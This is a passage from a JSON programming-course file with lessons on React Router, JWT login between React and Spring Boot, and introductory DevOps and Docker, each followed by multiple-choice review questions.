              "content": "Install React Router:\n\nnpm install react-router-dom\n\nBASIC SETUP:\n\nimport { BrowserRouter, Routes, Route, Link } from 'react-router-dom';\n\nfunction App() {\n    return (\n        <BrowserRouter>\n            <nav>\n                <Link to=\"/\">Home</Link>\n                <Link to=\"/about\">About</Link>\n                <Link to=\"/users\">Users</Link>\n            </nav>\n            \n            <Routes>\n                <Route path=\"/\" element={<HomePage />} />\n                <Route path=\"/about\" element={<AboutPage />} />\n                <Route path=\"/users\" element={<UsersPage />} />\n                <Route path=\"*\" element={<NotFoundPage />} />\n            </Routes>\n        </BrowserRouter>\n    );\n}\n\nKEY COMPONENTS:\n- BrowserRouter: Wraps your entire app, enables routing\n- Routes: Container for Route components\n- Route: Maps a path to a component\n- Link: Navigation links (like <a> but no page reload)\n\nNow:\n- / renders HomePage\n- /about renders AboutPage\n- /users renders UsersPage\n- Anything else renders NotFoundPage"
            },
            {
              "type": "EXAMPLE",
              "title": "Dynamic Routes and URL Parameters",
              "content": "Routes with parameters for dynamic content:",
              "code": "import { \n    BrowserRouter, Routes, Route, Link, \n    useParams, useNavigate \n} from 'react-router-dom';\n\n// Route with parameter\nfunction App() {\n    return (\n        <BrowserRouter>\n            <Routes>\n                <Route path=\"/\" element={<Home />} />\n                <Route path=\"/users\" element={<UserList />} />\n                <Route path=\"/users/:userId\" element={<UserProfile />} />\n                <Route path=\"/users/:userId/posts\" element={<UserPosts />} />\n            </Routes>\n        </BrowserRouter>\n    );\n}\n\n// Access URL parameters with useParams\nfunction UserProfile() {\n    const { userId } = useParams();  // Gets :userId from URL\n    const [user, setUser] = useState(null);\n    const [loading, setLoading] = useState(true);\n    \n    useEffect(() => {\n        fetch(`/api/users/${userId}`)\n            .then(res => res.json())\n            .then(data => {\n                setUser(data);\n                setLoading(false);\n            });\n    }, [userId]);  // Refetch when userId changes\n    \n    if (loading) return <div>Loading...</div>;\n    if (!user) return <div>User not found</div>;\n    \n    return (\n        <div>\n            <h1>{user.name}</h1>\n            <p>{user.email}</p>\n            <Link to={`/users/${userId}/posts`}>View Posts</Link>\n        </div>\n    );\n}\n\n// Programmatic navigation with useNavigate\nfunction LoginForm() {\n    const navigate = useNavigate();\n    \n    async function handleSubmit(e) {\n        e.preventDefault();\n        const success = await login(credentials);\n        if (success) {\n            navigate('/dashboard');  // Redirect after login\n            // or navigate(-1) to go back\n        }\n    }\n    \n    return <form onSubmit={handleSubmit}>...</form>;\n}",
              "language": "jsx"
            },
            {
              "type": "THEORY",
              "title": "Nested Routes and Layouts",
              "content": "Create layouts with nested routes:\n\nfunction App() {\n    return (\n        <BrowserRouter>\n            <Routes>\n                {/* Public routes */}\n                <Route path=\"/\" element={<PublicLayout />}>\n                    <Route index element={<Home />} />\n                    <Route path=\"about\" element={<About />} />\n                    <Route path=\"login\" element={<Login />} />\n                </Route>\n                \n                {/* Protected routes with different layout */}\n                <Route path=\"/dashboard\" element={<DashboardLayout />}>\n                    <Route index element={<DashboardHome />} />\n                    <Route path=\"settings\" element={<Settings />} />\n                    <Route path=\"users\" element={<Users />} />\n                </Route>\n            </Routes>\n        </BrowserRouter>\n    );\n}\n\n// Layout component with Outlet for child routes\nimport { Outlet, Link } from 'react-router-dom';\n\nfunction DashboardLayout() {\n    return (\n        <div className=\"dashboard\">\n            <nav className=\"sidebar\">\n                <Link to=\"/dashboard\">Home</Link>\n                <Link to=\"/dashboard/settings\">Settings</Link>\n                <Link to=\"/dashboard/users\">Users</Link>\n            </nav>\n            <main className=\"content\">\n                <Outlet />  {/* Child routes render here */}\n            </main>\n        </div>\n    );\n}\n\nURL STRUCTURE:\n/dashboard          -> DashboardLayout + DashboardHome\n/dashboard/settings -> DashboardLayout + Settings\n/dashboard/users    -> DashboardLayout + Users"
            },
            {
              "type": "KEY_POINT",
              "title": "Navigation and Active Links",
              "content": "LINK VS NAVLINK:\n\nimport { Link, NavLink } from 'react-router-dom';\n\n// Link - basic navigation\n<Link to=\"/about\">About</Link>\n\n// NavLink - adds active class automatically\n<NavLink \n    to=\"/about\" \n    className={({ isActive }) => isActive ? 'active' : ''}\n>\n    About\n</NavLink>\n\nNAVIGATE PROGRAMMATICALLY:\n\nimport { useNavigate } from 'react-router-dom';\n\nfunction SomeComponent() {\n    const navigate = useNavigate();\n    \n    function handleClick() {\n        navigate('/path');         // Navigate to path\n        navigate(-1);               // Go back\n        navigate(1);                // Go forward\n        navigate('/path', { replace: true }); // Replace current history\n    }\n}\n\nPASS STATE VIA NAVIGATION:\n\n// Sender\nnavigate('/checkout', { state: { cart: cartItems } });\n\n// Receiver\nimport { useLocation } from 'react-router-dom';\n\nfunction Checkout() {\n    const location = useLocation();\n    const { cart } = location.state || {};\n}\n\nQUERY PARAMETERS:\n\nimport { useSearchParams } from 'react-router-dom';\n\nfunction SearchResults() {\n    const [searchParams, setSearchParams] = useSearchParams();\n    const query = searchParams.get('q');      // ?q=react\n    const page = searchParams.get('page');    // ?page=2\n    \n    // Update search params\n    setSearchParams({ q: 'new query', page: 1 });\n}"
            },
            {
              "type": "EXAMPLE",
              "title": "Protected Routes Pattern",
              "content": "Implementing authentication-protected routes:",
              "code": "import { Navigate, Outlet, useLocation } from 'react-router-dom';\nimport { useAuth } from './hooks/useAuth';  // Your auth hook\n\n// Protected route wrapper\nfunction ProtectedRoute() {\n    const { user, loading } = useAuth();\n    const location = useLocation();\n    \n    if (loading) {\n        return <div>Loading...</div>;\n    }\n    \n    if (!user) {\n        // Redirect to login, save where they tried to go\n        return <Navigate to=\"/login\" state={{ from: location }} replace />;\n    }\n    \n    return <Outlet />;  // Render child routes\n}\n\n// App with protected routes\nfunction App() {\n    return (\n        <BrowserRouter>\n            <Routes>\n                {/* Public routes */}\n                <Route path=\"/\" element={<Home />} />\n                <Route path=\"/login\" element={<Login />} />\n                <Route path=\"/register\" element={<Register />} />\n                \n                {/* Protected routes */}\n                <Route element={<ProtectedRoute />}>\n                    <Route path=\"/dashboard\" element={<Dashboard />} />\n                    <Route path=\"/profile\" element={<Profile />} />\n                    <Route path=\"/settings\" element={<Settings />} />\n                </Route>\n                \n                <Route path=\"*\" element={<NotFound />} />\n            </Routes>\n        </BrowserRouter>\n    );\n}\n\n// Login component that redirects back\nfunction Login() {\n    const navigate = useNavigate();\n    const location = useLocation();\n    const { login } = useAuth();\n    \n    async function handleSubmit(credentials) {\n        await login(credentials);\n        // Redirect to where they tried to go, or dashboard\n        const from = location.state?.from?.pathname || '/dashboard';\n        navigate(from, { replace: true });\n    }\n    \n    return <LoginForm onSubmit={handleSubmit} />;\n}",
              "language": "jsx"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-5-mc-1",
              "title": "URL Parameters",
              "description": "Understanding dynamic route parameters",
              "question": "Given the route <Route path=\"/users/:userId/posts/:postId\" element={<PostDetail />} />, how do you access both parameters in PostDetail?",
              "options": [
                "const { userId, postId } = useParams();",
                "const params = useLocation().params;",
                "const [userId, postId] = useSearchParams();",
                "props.match.params.userId and props.match.params.postId"
              ],
              "correctAnswer": 0,
              "explanation": "useParams() returns an object with all URL parameters. For the route /users/:userId/posts/:postId visiting /users/123/posts/456, useParams() returns { userId: '123', postId: '456' }. You can destructure them directly. Note: parameters are always strings.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-5-mc-2",
              "title": "Protected Routes",
              "description": "Understanding route protection patterns",
              "question": "In a protected route pattern, what does <Navigate to=\"/login\" state={{ from: location }} /> do?",
              "options": [
                "Renders the login page inline without changing URL",
                "Redirects to login and saves the attempted URL so user can return after login",
                "Permanently redirects to login, user cannot go back",
                "Shows a login modal overlay on the current page"
              ],
              "correctAnswer": 1,
              "explanation": "Navigate performs a redirect to /login. The state prop passes the current location to the login page. After successful login, you can use this to redirect users back to where they originally tried to go (location.state?.from?.pathname). The replace prop would prevent adding to browser history.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "react-lesson-6",
          "title": "Lesson R.6: Connecting to Spring Boot",
          "moduleId": "module-react",
          "order": 6,
          "estimatedMinutes": 40,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Complete Auth Flow",
              "content": "Connecting React to Spring Boot with JWT authentication:\n\n1. USER ENTERS CREDENTIALS\n   React form collects username/password\n\n2. LOGIN REQUEST\n   POST /api/auth/login\n   Body: { username, password }\n\n3. SPRING BOOT VALIDATES\n   - Finds user in database\n   - Verifies password with BCrypt\n   - Generates JWT token\n\n4. RESPONSE WITH TOKEN\n   { token: \"eyJhbG...\", user: { id, name, roles } }\n\n5. STORE TOKEN IN REACT\n   - Save to localStorage (persists)\n   - Or sessionStorage (clears on close)\n   - Update auth context\n\n6. SUBSEQUENT REQUESTS\n   All API calls include header:\n   Authorization: Bearer eyJhbG...\n\n7. SPRING BOOT VALIDATES TOKEN\n   - Extract token from header\n   - Verify signature\n   - Check expiration\n   - Load user from token\n\n8. LOGOUT\n   - Clear stored token\n   - Reset auth state\n   - Redirect to login"
            },
            {
              "type": "EXAMPLE",
              "title": "Auth Context and Hook",
              "content": "Managing authentication state across the React app:",
              "code": "// src/contexts/AuthContext.jsx\nimport { createContext, useContext, useState, useEffect } from 'react';\n\nconst AuthContext = createContext(null);\n\nexport function AuthProvider({ children }) {\n    const [user, setUser] = useState(null);\n    const [token, setToken] = useState(localStorage.getItem('token'));\n    const [loading, setLoading] = useState(true);\n    \n    // Check for existing token on mount\n    useEffect(() => {\n        if (token) {\n            validateToken();\n        } else {\n            setLoading(false);\n        }\n    }, []);\n    \n    async function validateToken() {\n        try {\n            const response = await fetch('/api/auth/me', {\n                headers: { 'Authorization': `Bearer ${token}` }\n            });\n            if (response.ok) {\n                const userData = await response.json();\n                setUser(userData);\n            } else {\n                // Token invalid or expired\n                logout();\n            }\n        } catch (error) {\n            logout();\n        } finally {\n            setLoading(false);\n        }\n    }\n    \n    async function login(username, password) {\n        const response = await fetch('/api/auth/login', {\n            method: 'POST',\n            headers: { 'Content-Type': 'application/json' },\n            body: JSON.stringify({ username, password })\n        });\n        \n        if (!response.ok) {\n            const error = await response.json();\n            throw new Error(error.message || 'Login failed');\n        }\n        \n        const data = await response.json();\n        localStorage.setItem('token', data.token);\n        setToken(data.token);\n        setUser(data.user);\n        return data;\n    }\n    \n    function logout() {\n        localStorage.removeItem('token');\n        setToken(null);\n        setUser(null);\n    }\n    \n    const value = {\n        user,\n        token,\n        loading,\n        isAuthenticated: !!user,\n        login,\n        logout\n    };\n    \n    return (\n        <AuthContext.Provider value={value}>\n            {children}\n        </AuthContext.Provider>\n    );\n}\n\nexport function useAuth() {\n    const context = useContext(AuthContext);\n    if (!context) {\n        throw new Error('useAuth must be used within AuthProvider');\n    }\n    return context;\n}",
              "language": "jsx"
            },
            {
              "type": "THEORY",
              "title": "Authenticated API Calls",
              "content": "Every API call to protected endpoints needs the JWT:\n\nMANUAL APPROACH (tedious):\n\nconst token = localStorage.getItem('token');\n\nfetch('/api/users', {\n    headers: {\n        'Authorization': `Bearer ${token}`,\n        'Content-Type': 'application/json'\n    }\n});\n\nBETTER: API SERVICE WRAPPER:\n\n// src/services/api.js\nconst API_BASE = 'http://localhost:8080/api';\n\nasync function fetchWithAuth(endpoint, options = {}) {\n    const token = localStorage.getItem('token');\n    \n    const config = {\n        ...options,\n        headers: {\n            'Content-Type': 'application/json',\n            ...options.headers,\n        }\n    };\n    \n    if (token) {\n        config.headers['Authorization'] = `Bearer ${token}`;\n    }\n    \n    const response = await fetch(`${API_BASE}${endpoint}`, config);\n    \n    // Handle token expiration\n    if (response.status === 401) {\n        localStorage.removeItem('token');\n        window.location.href = '/login';\n        throw new Error('Session expired');\n    }\n    \n    if (!response.ok) {\n        const error = await response.json().catch(() => ({}));\n        throw new Error(error.message || `HTTP ${response.status}`);\n    }\n    \n    return response.json();\n}\n\nexport const api = {\n    get: (endpoint) => fetchWithAuth(endpoint),\n    post: (endpoint, data) => fetchWithAuth(endpoint, {\n        method: 'POST',\n        body: JSON.stringify(data)\n    }),\n    put: (endpoint, data) => fetchWithAuth(endpoint, {\n        method: 'PUT',\n        body: JSON.stringify(data)\n    }),\n    delete: (endpoint) => fetchWithAuth(endpoint, {\n        method: 'DELETE'\n    })\n};\n\nUSAGE:\nimport { api } from './services/api';\n\nconst users = await api.get('/users');\nawait api.post('/users', { name: 'John' });"
            },
            {
              "type": "EXAMPLE",
              "title": "Complete Login Component",
              "content": "Full login form with error handling and redirect:",
              "code": "import { useState } from 'react';\nimport { useNavigate, useLocation, Link } from 'react-router-dom';\nimport { useAuth } from '../contexts/AuthContext';\n\nfunction LoginPage() {\n    const [email, setEmail] = useState('');\n    const [password, setPassword] = useState('');\n    const [error, setError] = useState('');\n    const [loading, setLoading] = useState(false);\n    \n    const { login } = useAuth();\n    const navigate = useNavigate();\n    const location = useLocation();\n    \n    // Where to redirect after login\n    const from = location.state?.from?.pathname || '/dashboard';\n    \n    async function handleSubmit(e) {\n        e.preventDefault();\n        setError('');\n        setLoading(true);\n        \n        try {\n            await login(email, password);\n            navigate(from, { replace: true });\n        } catch (err) {\n            setError(err.message || 'Invalid email or password');\n        } finally {\n            setLoading(false);\n        }\n    }\n    \n    return (\n        <div className=\"login-page\">\n            <div className=\"login-card\">\n                <h1>Welcome Back</h1>\n                <p className=\"subtitle\">Sign in to your account</p>\n                \n                {error && (\n                    <div className=\"error-banner\" role=\"alert\">\n                        {error}\n                    </div>\n                )}\n                \n                <form onSubmit={handleSubmit}>\n                    <div className=\"form-group\">\n                        <label htmlFor=\"email\">Email</label>\n                        <input\n                            id=\"email\"\n                            type=\"email\"\n                            value={email}\n                            onChange={(e) => setEmail(e.target.value)}\n                            required\n                            disabled={loading}\n                            autoComplete=\"email\"\n                        />\n                    </div>\n                    \n                    <div className=\"form-group\">\n                        <label htmlFor=\"password\">Password</label>\n                        <input\n                            id=\"password\"\n                            type=\"password\"\n                            value={password}\n                            onChange={(e) => setPassword(e.target.value)}\n                            required\n                            disabled={loading}\n                            autoComplete=\"current-password\"\n                        />\n                    </div>\n                    \n                    <button type=\"submit\" disabled={loading} className=\"btn-primary\">\n                        {loading ? 'Signing in...' : 'Sign In'}\n                    </button>\n                </form>\n                \n                <p className=\"signup-link\">\n                    Don't have an account? <Link to=\"/register\">Sign up</Link>\n                </p>\n            </div>\n        </div>\n    );\n}\n\nexport default LoginPage;",
              "language": "jsx"
            },
            {
              "type": "KEY_POINT",
              "title": "Spring Boot JWT Endpoint",
              "content": "The Spring Boot side for JWT authentication:\n\n@RestController\n@RequestMapping(\"/api/auth\")\npublic class AuthController {\n    \n    private final AuthenticationManager authManager;\n    private final JwtService jwtService;\n    private final UserService userService;\n    \n    @PostMapping(\"/login\")\n    public ResponseEntity<?> login(@RequestBody LoginRequest request) {\n        try {\n            // Authenticate credentials\n            Authentication auth = authManager.authenticate(\n                new UsernamePasswordAuthenticationToken(\n                    request.getEmail(), \n                    request.getPassword()\n                )\n            );\n            \n            // Generate JWT\n            UserDetails user = (UserDetails) auth.getPrincipal();\n            String token = jwtService.generateToken(user);\n            \n            return ResponseEntity.ok(new AuthResponse(token, user));\n            \n        } catch (BadCredentialsException e) {\n            return ResponseEntity.status(401)\n                .body(Map.of(\"message\", \"Invalid email or password\"));\n        }\n    }\n    \n    @GetMapping(\"/me\")\n    public ResponseEntity<?> getCurrentUser(\n            @AuthenticationPrincipal UserDetails user) {\n        if (user == null) {\n            return ResponseEntity.status(401)\n                .body(Map.of(\"message\", \"Not authenticated\"));\n        }\n        return ResponseEntity.ok(userService.findByEmail(user.getUsername()));\n    }\n}\n\nEXPECTED RESPONSES:\n\nPOST /api/auth/login (success):\n{\n    \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\",\n    \"user\": { \"id\": 1, \"email\": \"john@example.com\", \"name\": \"John\" }\n}\n\nPOST /api/auth/login (failure):\n{\n    \"message\": \"Invalid email or password\"\n}"
            },
            {
              "type": "WARNING",
              "title": "Security Best Practices",
              "content": "TOKEN STORAGE:\n\nlocalStorage:\n+ Persists across sessions\n- Vulnerable to XSS attacks\n\nsessionStorage:\n+ Clears when tab closes\n- Lost on refresh (bad UX)\n\nHttpOnly Cookie (most secure):\n+ Not accessible via JavaScript\n+ Automatic on every request\n- Requires backend to set cookie\n- CSRF protection needed\n\nFOR LEARNING: localStorage is fine\nFOR PRODUCTION: Use HttpOnly cookies with CSRF protection\n\nNEVER DO:\n\n// Never log tokens\nconsole.log('Token:', token);\n\n// Never put tokens in URLs\nfetch(`/api/users?token=${token}`);\n\n// Never store in global variables\nwindow.authToken = token;\n\nALWAYS DO:\n\n// Check token expiration\nfunction isTokenExpired(token) {\n    const payload = JSON.parse(atob(token.split('.')[1]));\n    return payload.exp * 1000 < Date.now();\n}\n\n// Clear token on logout\nfunction logout() {\n    localStorage.removeItem('token');\n    // Navigate to login\n}\n\n// Handle 401 responses globally\nif (response.status === 401) {\n    logout();\n}"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-6-mc-1",
              "title": "JWT in Headers",
              "description": "Understanding how to send JWT to the backend",
              "question": "What is the correct format for sending a JWT token in an HTTP request?",
              "options": [
                "Headers: { 'Token': 'eyJhbG...' }",
                "Headers: { 'Authorization': 'eyJhbG...' }",
                "Headers: { 'Authorization': 'Bearer eyJhbG...' }",
                "Query parameter: ?jwt=eyJhbG..."
              ],
              "correctAnswer": 2,
              "explanation": "The standard format is 'Authorization: Bearer <token>'. The 'Bearer' scheme indicates token-based authentication per RFC 6750. Spring Security's JwtAuthenticationFilter expects this format. Never put tokens in URLs (logged, cached, visible in history).",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-6-mc-2",
              "title": "Token Storage Security",
              "description": "Understanding security implications of token storage",
              "question": "Why are HttpOnly cookies more secure than localStorage for storing JWT tokens?",
              "options": [
                "HttpOnly cookies are encrypted, localStorage is not",
                "HttpOnly cookies cannot be accessed by JavaScript, preventing XSS attacks from stealing the token",
                "HttpOnly cookies automatically expire, localStorage tokens don't",
                "HttpOnly cookies work with CORS, localStorage doesn't"
              ],
              "correctAnswer": 1,
              "explanation": "HttpOnly cookies cannot be accessed via JavaScript (document.cookie won't show them). This means even if an attacker injects malicious JavaScript (XSS attack), they cannot steal the token. localStorage is accessible via JavaScript, so any XSS vulnerability could expose the token. HttpOnly cookies still require CSRF protection.",
              "difficulty": "advanced"
            }
          ]
        }
      ],
      "order": 13
    },
    {
      "id": "module-devops",
      "title": "DevOps & Deployment",
      "description": "Learn to containerize, automate, and deploy your Spring Boot applications. Master Docker, CI/CD pipelines, and cloud deployment.",
      "difficulty": "intermediate",
      "estimatedHours": 3.1,
      "lessons": [
        {
          "id": "devops-lesson-1",
          "title": "Lesson D.1: Why DevOps?",
          "moduleId": "module-devops",
          "order": 1,
          "estimatedMinutes": 25,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Works on My Machine",
              "content": "You've built an amazing Spring Boot application. It runs perfectly on your laptop. You're ready to show the world.\n\nThen reality hits:\n\nDEVELOPER: 'The app works on my machine!'\nOPS TEAM: 'We deployed it and it crashes.'\nDEVELOPER: 'That's impossible, I tested it!'\nOPS TEAM: 'You're running Java 21, production has Java 17.'\nDEVELOPER: 'Well... update Java then.'\nOPS TEAM: 'That breaks 15 other applications.'\n\nThis is the classic 'works on my machine' problem. And it's been plaguing software teams for decades.\n\nTHE ROOT CAUSES:\n- Different Java versions between dev and production\n- Missing environment variables\n- Different database versions\n- Different OS configurations\n- Missing system dependencies\n- Configuration drift over time\n\nWhat if your application could carry its ENTIRE environment with it? Same Java version, same configs, same everything - everywhere it runs?"
            },
            {
              "type": "KEY_POINT",
              "title": "Dev vs Ops: The Traditional Wall",
              "content": "Historically, software companies had two separate teams:\n\nDEVELOPMENT TEAM:\n- Writes code\n- Tests on local machines\n- Throws code 'over the wall'\n- Success = features work in development\n\nOPERATIONS TEAM:\n- Receives code to deploy\n- Manages servers and infrastructure\n- Fights fires when things break\n- Success = systems stay running\n\nTHE PROBLEM:\n- Devs optimize for speed of development\n- Ops optimizes for stability\n- Different goals = conflict\n- No one 'owns' the whole process\n\nWhen things break:\n- Devs: 'It worked in development!'\n- Ops: 'You didn't test it properly!'\n- Both are right. Both are wrong.\n\nThe 'wall' between teams creates:\n- Slow deployments (weeks, not hours)\n- Blame games when issues arise\n- Lack of shared responsibility\n- Technical debt accumulation"
            },
            {
              "type": "THEORY",
              "title": "DevOps: Breaking Down the Wall",
              "content": "DevOps is a culture and set of practices that UNIFIES development and operations:\n\nDEVOPS PRINCIPLES:\n\n1. COLLABORATION\n   - Developers and Ops work together\n   - Shared responsibility for the entire lifecycle\n   - No more 'throw it over the wall'\n\n2. AUTOMATION\n   - Automate testing, building, deploying\n   - Reduce human error\n   - Make deployments boring (in a good way)\n\n3. CONTINUOUS INTEGRATION (CI)\n   - Merge code frequently (multiple times/day)\n   - Automatically test every change\n   - Catch bugs early, when they're cheap to fix\n\n4. CONTINUOUS DEPLOYMENT (CD)\n   - Automatically deploy tested code\n   - Small, frequent releases\n   - Easy to rollback if issues arise\n\n5. INFRASTRUCTURE AS CODE\n   - Define servers/config in version-controlled files\n   - Reproducible environments\n   - No more 'snowflake' servers\n\nRESULTS:\n- Deploy multiple times per day (not quarterly)\n- Recover from failures in minutes (not hours)\n- 99.9%+ uptime\n- Happy developers AND happy ops"
            },
            {
              "type": "KEY_POINT",
              "title": "The CI/CD Pipeline",
              "content": "A CI/CD pipeline automates the journey from code to production:\n\n[Developer pushes code]\n        |\n        v\n[1. SOURCE CONTROL]\n   Git repository receives commit\n        |\n        v\n[2. BUILD]\n   Compile code, resolve dependencies\n   ./mvnw clean package\n        |\n        v\n[3. TEST]\n   Run unit tests, integration tests\n   ./mvnw test\n        |\n        v\n[4. ANALYZE] (optional)\n   Code quality, security scanning\n        |\n        v\n[5. PACKAGE]\n   Create deployable artifact (JAR, Docker image)\n        |\n        v\n[6. DEPLOY TO STAGING]\n   Test in production-like environment\n        |\n        v\n[7. DEPLOY TO PRODUCTION]\n   Release to users\n        |\n        v\n[8. MONITOR]\n   Track performance, errors, usage\n\nIF ANY STEP FAILS:\n- Pipeline stops\n- Team is notified immediately\n- Bad code never reaches production"
            },
            {
              "type": "THEORY",
              "title": "Tools of the Trade",
              "content": "CONTAINERIZATION:\n- Docker: Package app + environment together\n- Docker Compose: Define multi-container apps\n\nCI/CD PLATFORMS:\n- GitHub Actions: Built into GitHub, free for public repos\n- GitLab CI: Built into GitLab\n- Jenkins: Self-hosted, highly customizable\n- CircleCI, Travis CI: Cloud-based options\n\nCLOUD PLATFORMS:\n- Railway: Simple deployment, great for learning\n- Heroku: Easy PaaS (Platform as a Service)\n- AWS, GCP, Azure: Full cloud providers\n- DigitalOcean, Render: Developer-friendly options\n\nMONITORING:\n- Prometheus + Grafana: Metrics and dashboards\n- ELK Stack: Log aggregation\n- Datadog, New Relic: All-in-one monitoring\n\nIN THIS MODULE:\nWe'll focus on the most practical tools:\n1. Docker - containerize your Spring Boot app\n2. Docker Compose - add PostgreSQL database\n3. GitHub Actions - automate testing and deployment\n4. Railway - deploy to the cloud for free\n\nBy the end, every push to main = automatic deployment."
            },
            {
              "type": "WARNING",
              "title": "DevOps is Culture, Not Just Tools",
              "content": "Common mistake: 'We use Docker, so we're doing DevOps!'\n\nDEVOPS IS NOT:\n- Just using Docker\n- Just having a CI/CD pipeline\n- A job title (though 'DevOps Engineer' exists)\n- A tool you can buy\n\nDEVOPS IS:\n- Shared responsibility between dev and ops\n- Continuous improvement mindset\n- Automating repetitive tasks\n- Learning from failures (blameless postmortems)\n- Measuring and improving metrics\n\nKEY METRICS (DORA):\n1. Deployment Frequency - How often do you deploy?\n2. Lead Time - Code commit to production?\n3. Mean Time to Recovery - How fast do you fix issues?\n4. Change Failure Rate - What % of deployments cause problems?\n\nELITE PERFORMERS:\n- Deploy multiple times per day\n- Lead time under 1 hour\n- Recover in under 1 hour\n- Less than 15% change failure rate\n\nYou don't need to be elite on day one. Start small, automate incrementally, improve continuously."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-1-mc-1",
              "title": "Understanding CI/CD",
              "description": "Grasping the purpose of continuous integration",
              "question": "What is the PRIMARY benefit of Continuous Integration (CI)?",
              "options": [
                "It eliminates the need for testing",
                "It catches bugs early by testing every code change automatically",
                "It makes deployments faster by skipping the build step",
                "It replaces the need for version control"
              ],
              "correctAnswer": 1,
              "explanation": "Continuous Integration automatically tests every code change as soon as it's pushed. This catches bugs early, when they're easier and cheaper to fix. The earlier you catch a bug, the less context-switching required to fix it. CI doesn't skip steps - it automates them.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "devops-lesson-1-mc-2",
              "title": "Works on My Machine Problem",
              "description": "Understanding environment consistency",
              "question": "Your Spring Boot app works locally but crashes in production with 'NoSuchMethodError'. What's the MOST LIKELY cause?",
              "options": [
                "The production server is too slow",
                "Different Java version or dependency versions between environments",
                "The database password is wrong",
                "The network connection is unstable"
              ],
              "correctAnswer": 1,
              "explanation": "NoSuchMethodError typically means a method existed at compile time but not at runtime - usually caused by version mismatches. Different Java versions or dependency versions between development and production are a classic 'works on my machine' problem. Docker solves this by packaging the exact environment with your application.",
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "devops-lesson-2",
          "title": "Lesson D.2: Docker Fundamentals",
          "moduleId": "module-devops",
          "order": 2,
          "estimatedMinutes": 45,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "What is Docker?",
              "content": "Docker is a platform that packages your application and ALL its dependencies into a portable unit called a CONTAINER.\n\nTHINK OF IT LIKE SHIPPING:\n\nBEFORE SHIPPING CONTAINERS:\n- Load individual items onto ships\n- Different sizes, shapes, fragile items\n- Complex loading/unloading\n- Items get damaged, lost, mixed up\n\nAFTER SHIPPING CONTAINERS:\n- Everything goes in a standard container\n- Container fits on any ship, truck, train\n- Predictable, stackable, secure\n- Contents don't matter - container is container\n\nDOCKER DOES THE SAME FOR SOFTWARE:\n- Your app + Java + configs = one container\n- Runs identically on any machine with Docker\n- No more 'works on my machine'\n- Dev, test, production - same container\n\nKEY TERMINOLOGY:\n- Image: The blueprint (like a class)\n- Container: Running instance (like an object)\n- Dockerfile: Recipe to build an image\n- Registry: Storage for images (Docker Hub)"
            },
            {
              "type": "KEY_POINT",
              "title": "Containers vs Virtual Machines",
              "content": "VIRTUAL MACHINE (VM):\n\n[Your App]\n[Guest OS - Full Linux/Windows]\n[Hypervisor]\n[Host OS]\n[Hardware]\n\n- Each VM runs its OWN operating system\n- Heavy - GB of storage, minutes to start\n- Strong isolation\n- Good for running different OS\n\nCONTAINER:\n\n[Your App]\n[Container Runtime]\n[Host OS]\n[Hardware]\n\n- Containers SHARE the host OS kernel\n- Lightweight - MB of storage, seconds to start\n- Process-level isolation\n- Great for microservices\n\nWHY CONTAINERS WIN FOR APPS:\n- Start in seconds, not minutes\n- Use fewer resources (run 10x more on same hardware)\n- Perfect for microservices architecture\n- Easy to scale up/down\n\nWHEN VMs STILL MAKE SENSE:\n- Running different operating systems\n- Stronger security isolation required\n- Legacy applications that need full OS"
            },
            {
              "type": "EXAMPLE",
              "title": "Your First Dockerfile",
              "content": "A Dockerfile defines how to build your container image. Here's a production-ready Dockerfile for Spring Boot:",
              "code": "# Build stage - compiles the application\nFROM eclipse-temurin:21-jdk-alpine AS build\n\n# Set working directory inside container\nWORKDIR /app\n\n# Copy Maven wrapper and pom.xml first (better caching)\nCOPY .mvn/ .mvn/\nCOPY mvnw pom.xml ./\n\n# Download dependencies (cached if pom.xml unchanged)\nRUN ./mvnw dependency:go-offline\n\n# Copy source code\nCOPY src/ src/\n\n# Build the application\nRUN ./mvnw clean package -DskipTests\n\n# Runtime stage - smaller image for production\nFROM eclipse-temurin:21-jre-alpine\n\n# Create non-root user for security\nRUN addgroup -S spring && adduser -S spring -G spring\nUSER spring:spring\n\n# Set working directory\nWORKDIR /app\n\n# Copy JAR from build stage\nCOPY --from=build /app/target/*.jar app.jar\n\n# Document the port (doesn't actually expose it)\nEXPOSE 8080\n\n# Health check for container orchestration\nHEALTHCHECK --interval=30s --timeout=3s \\\n  CMD wget -q --spider http://localhost:8080/actuator/health || exit 1\n\n# Run the application\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]",
              "language": "dockerfile"
            },
            {
              "type": "THEORY",
              "title": "Dockerfile Instructions Explained",
              "content": "ESSENTIAL INSTRUCTIONS:\n\nFROM <image>:<tag>\n  Base image to build on\n  eclipse-temurin:21-jdk-alpine = Java 21 on Alpine Linux\n  Alpine = lightweight Linux (5MB vs 200MB)\n\nWORKDIR /path\n  Set working directory for subsequent commands\n  Like 'cd' but creates if doesn't exist\n\nCOPY <source> <destination>\n  Copy files from host to container\n  COPY . . = copy everything (avoid - include .git, etc.)\n  COPY src/ src/ = copy specific directories\n\nRUN <command>\n  Execute command during image BUILD\n  Each RUN creates a new layer\n  Combine commands with && to reduce layers\n\nEXPOSE <port>\n  Document which port the app uses\n  Doesn't actually publish the port\n  Publishing done with -p when running\n\nENTRYPOINT [\"command\", \"arg1\"]\n  Command to run when container STARTS\n  Use exec form [\"...\"] not shell form\n\nMULTI-STAGE BUILDS:\n\nFROM eclipse-temurin:21-jdk-alpine AS build\n  # Full JDK for compilation\n  # ~300MB image\n\nFROM eclipse-temurin:21-jre-alpine\n  # Only JRE for runtime\n  # ~100MB image\n  COPY --from=build /app/target/*.jar app.jar\n\nResult: Production image is 1/3 the size!"
            },
